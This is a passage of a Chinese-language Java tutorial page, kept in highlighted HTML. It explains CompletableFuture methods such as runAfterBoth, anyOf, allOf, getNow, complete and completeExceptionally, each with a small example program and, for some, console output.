            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"已经有一个任务完成了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="runAfterBoth">runAfterBoth</h4>
<p>两个线程任务相比较，两个全部执行完成，才进行下一步操作，不关心运行结果。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">CompletionStage</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Void</span><span class="token punctuation">&gt;</span></span> <span class="token function">runAfterBoth</span><span class="token punctuation">(</span><span class="token class-name">CompletionStage</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> other<span class="token punctuation">,</span><span class="token class-name">Runnable</span> action<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">public</span> <span class="token class-name">CompletionStage</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Void</span><span class="token punctuation">&gt;</span></span> <span class="token function">runAfterBothAsync</span><span class="token punctuation">(</span><span class="token class-name">CompletionStage</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> other<span class="token punctuation">,</span><span class="token class-name">Runnable</span> action<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">public</span> <span class="token class-name">CompletionStage</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Void</span><span class="token punctuation">&gt;</span></span> <span class="token function">runAfterBothAsync</span><span class="token punctuation">(</span><span class="token class-name">CompletionStage</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> other<span class="token punctuation">,</span><span class="token class-name">Runnable</span> action<span class="token punctuation">,</span><span class="token class-name">Executor</span> executor<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>示例</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">CompletableFuture</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">TimeUnit</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>function<span class="token punctuation">.</span></span><span class="token class-name">Supplier</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CompletableFutureTest</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> future1 <span class="token operator">=</span> <span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">supplyAsync</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Supplier</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token annotation punctuation">@Override</span>
            <span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">try</span> <span class="token punctuation">{</span>
                    <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"第一阶段：1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> future2 <span class="token operator">=</span> <span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">supplyAsync</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Supplier</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token annotation punctuation">@Override</span>
            <span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">try</span> <span class="token punctuation">{</span>
                    <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"第二阶段：2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> <span class="token number">2</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        future1<span class="token punctuation">.</span><span class="token function">runAfterBoth</span><span class="token punctuation">(</span>future2<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Runnable</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token annotation punctuation">@Override</span>
            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"上面两个任务都执行完成了。"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="anyOf">anyOf</h4>
<p>anyOf 方法的参数是多个给定的 CompletableFuture，当其中的任何一个完成时，返回这个任务的 CompletableFuture</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ExecutionException</span><span class="token punctuation">,</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">{</span>
    <span class="token class-name">Random</span> random <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> future1 <span class="token operator">=</span> <span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">supplyAsync</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token string">"hello"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> future2 <span class="token operator">=</span> <span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">supplyAsync</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token string">"world"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> result <span class="token operator">=</span> <span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">anyOf</span><span class="token punctuation">(</span>future1<span class="token punctuation">,</span> future2<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="allOf">allOf</h4>
<p>allOf方法用来实现监听 多个 CompletableFuture 的全部完成。</p>
<p>示例</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> future1 <span class="token operator">=</span> <span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">supplyAsync</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"future1完成！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token string">"future1完成！"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> future2 <span class="token operator">=</span> <span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">supplyAsync</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"future2完成！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token string">"future2完成！"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Void</span><span class="token punctuation">&gt;</span></span> combindFuture <span class="token operator">=</span> <span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">allOf</span><span class="token punctuation">(</span>future1<span class="token punctuation">,</span> future2<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">try</span> <span class="token punctuation">{</span>
        combindFuture<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ExecutionException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"future1: "</span> <span class="token operator">+</span> future1<span class="token punctuation">.</span><span class="token function">isDone</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"，future2: "</span> <span class="token operator">+</span> future2<span class="token punctuation">.</span><span class="token function">isDone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="CompletableFuture：其他">CompletableFuture：其他</h3>
<h4 id="getNow：提交任务继续运行">getNow：提交任务继续运行</h4>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">T</span> <span class="token function">getNow</span><span class="token punctuation">(</span><span class="token class-name">T</span> valueIfAbsent<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>示例：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CompletableFutureExample4</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">{</span>
        <span class="token class-name">String</span> result <span class="token operator">=</span> <span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">supplyAsync</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" 任务继续执行"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" HELLO"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getNow</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" WORLD"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" main exit."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token keyword">int</span> seconds<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span>seconds<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

# <span class="token class-name">Console</span>输出
<span class="token number">1659410799621</span> <span class="token constant">WORLD</span>
<span class="token number">1659410802622</span> 任务继续执行
<span class="token number">1659411545079</span> main exit<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="complete：提交任务不会继续运行">complete：提交任务不会继续运行</h4>
<p>如果尚未完成，则将 get() 和相关方法返回的值设置为给定值</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">complete</span><span class="token punctuation">(</span><span class="token class-name">T</span> value<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>示例：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CompletableFutureExample5</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ExecutionException</span><span class="token punctuation">,</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">{</span>
        <span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> result <span class="token operator">=</span> <span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">supplyAsync</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" 任务继续执行"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" HELLO"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">boolean</span> status <span class="token operator">=</span> result<span class="token punctuation">.</span><span class="token function">complete</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" WORLD"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> status<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" main exit."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token keyword">int</span> seconds<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span>seconds<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
# <span class="token class-name">Console</span>输出
<span class="token number">1659410986243</span> <span class="token boolean">true</span>
<span class="token number">1659410986243</span> <span class="token constant">WORLD</span>
<span class="token number">1659410991249</span> main exit<span class="token punctuation">.</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="completeExceptionally">completeExceptionally</h4>
<p>如果任务尚未完成，则导致调用 get() 和相关方法抛出给定的异常</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">completeExceptionally</span><span class="token punctuation">(</span><span class="token class-name">Throwable</span> ex<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>示例</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CompletableFutureExample6</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ExecutionException</span><span class="token punctuation">,</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">{</span>
        <span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> result <span class="token operator">=</span> <span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">supplyAsync</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" 任务继续执行"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
